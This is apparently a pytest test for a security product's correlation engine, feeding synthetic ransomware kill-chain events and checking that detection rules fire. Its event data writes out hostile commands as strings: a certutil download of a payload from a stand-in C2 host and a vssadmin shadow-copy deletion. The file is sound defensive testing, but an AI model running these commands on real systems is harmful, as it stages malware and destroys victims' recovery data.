"""Safe synthetic end-to-end livefire test for ransomware kill-chain detection.

Tests:
1. Deploys synthetic decoy canary files to an isolated temporary directory.
2. Simulates an adversary progression through synthetic event ingestion:
   - Phase 1: LOLBin download/staging (certutil)
   - Phase 2: Shadow copy deletion attempt
   - Phase 3: Canary file tampering tripwire
   - Phase 4: Bulk file extension modification
3. Verifies that CorrelationEngine evaluates the sequence, fires individual
   detections, and successfully triggers the 'ransomware_chain' composite incident.
4. Operates 100% synthetically in userland memory without touching real host
   processes or real OS volume shadow copies.
"""

from __future__ import annotations

import tempfile
import time
from collections import defaultdict, deque
from pathlib import Path
from unittest.mock import AsyncMock

import pytest

from app.services.correlation_engine import CorrelationEngine
from app.services.rules_loader import load_rules

RULES_PATH = Path(__file__).parent.parent.parent / "app" / "rules"


def _build_test_engine(event_bus_mock: AsyncMock | None = None) -> CorrelationEngine:
    engine = CorrelationEngine.__new__(CorrelationEngine)
    engine.MAX_EVENTS = 10_000
    engine.COOLDOWN_SECONDS = 60
    engine._window = deque(maxlen=engine.MAX_EVENTS)
    engine._fired = {}
    engine._chain_fired = {}
    engine._sigma_fire_log = defaultdict(deque)
    engine._stats = {
        "events_processed": 0,
        "rules_triggered": 0,
        "chains_triggered": 0,
        "custom_rules": 0,
        "started_at": "",
    }
    engine._event_bus = event_bus_mock
    engine._watcher = None
    pack = load_rules(RULES_PATH)
    engine._rule_pack = pack
    engine._rules = [r for rules in pack.rules.values() for r in rules]
    engine._chain_rules = list(pack.chains)
    engine._rules_by_type = engine._build_type_index(engine._rules)
    return engine


@pytest.mark.asyncio
async def test_synthetic_ransomware_livefire_simulation():
    """Execute a fully isolated synthetic ransomware attack run against the detection engine."""
    bus_mock = AsyncMock()
    engine = _build_test_engine(bus_mock)
    now = time.time()
    source_ip = "198.51.100.199"
    hostname = "isolated-test-workstation"

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        # 1. Plant synthetic canary tripwire decoy files
        canary_file = tmp_path / ".canary_tripwire.docx"
        canary_file.write_text("DEC_CANARY_ACTIVE_HONEYFILE_HEADER_XYZ", encoding="utf-8")
        assert canary_file.exists()

        # Phase 1: LOLBin Staging (certutil download)
        ev_stage1 = {
            "event_type": "process_creation",
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://malicious-c2.example/locker.bin locker.exe",
            "hostname": hostname,
            "source_ip": source_ip,
            "timestamp": now - 120,
        }
        engine._window.append((now - 120, ev_stage1))
        t1 = await engine.evaluate(ev_stage1)
        fired_ids1 = [r["id"] for r in t1]
        assert "ransomware_lolbin_certutil" in fired_ids1, f"Expected certutil rule to fire, got: {fired_ids1}"

        # Phase 2: Inhibit System Recovery (shadow copy delete)
        ev_stage2 = {
            "event_type": "process_creation",
            "process_name": "vssadmin.exe",
            "command_line": "vssadmin.exe delete shadows /all /quiet",
            "hostname": hostname,
            "source_ip": source_ip,
            "timestamp": now - 60,
        }
        engine._window.append((now - 60, ev_stage2))
        t2 = await engine.evaluate(ev_stage2)
        fired_ids2 = [r["id"] for r in t2]
        assert "ransomware_shadow_delete" in fired_ids2, f"Expected shadow delete rule to fire, got: {fired_ids2}"

        # Phase 3: Canary File Tripwire Touch
        ev_stage3 = {
            "event_type": "canary_touch",
            "file_path": str(canary_file),
            "hostname": hostname,
            "source_ip": source_ip,
            "timestamp": now - 30,
        }
        engine._window.append((now - 30, ev_stage3))
        t3 = await engine.evaluate(ev_stage3)
        fired_ids3 = [r["id"] for r in t3]
        assert "ransomware_canary_tripped" in fired_ids3, f"Expected canary tripped rule to fire, got: {fired_ids3}"

        # Phase 4: Mass File Extension Renaming (triggering encryption phase)
        for i in range(25):
            ev_stage4 = {
                "event_type": "file_extension_change",
                "new_extension": ".locked",
                "process_pid": 9912,
                "hostname": hostname,
                "source_ip": source_ip,
                "timestamp": now - 10 + (i * 0.1),
            }
            engine._window.append((now - 10 + (i * 0.1), ev_stage4))

        # Final trigger event
        t4 = await engine.evaluate(ev_stage4)
        fired_ids4 = [r["id"] for r in t4]
        assert "ransomware_mass_extension_change" in fired_ids4, f"Expected mass extension rule to fire, got: {fired_ids4}"

        # Assert composite ransomware kill-chain triggered
        assert engine._stats["chains_triggered"] == 1
        assert ("ransomware_chain", source_ip) in engine._chain_fired
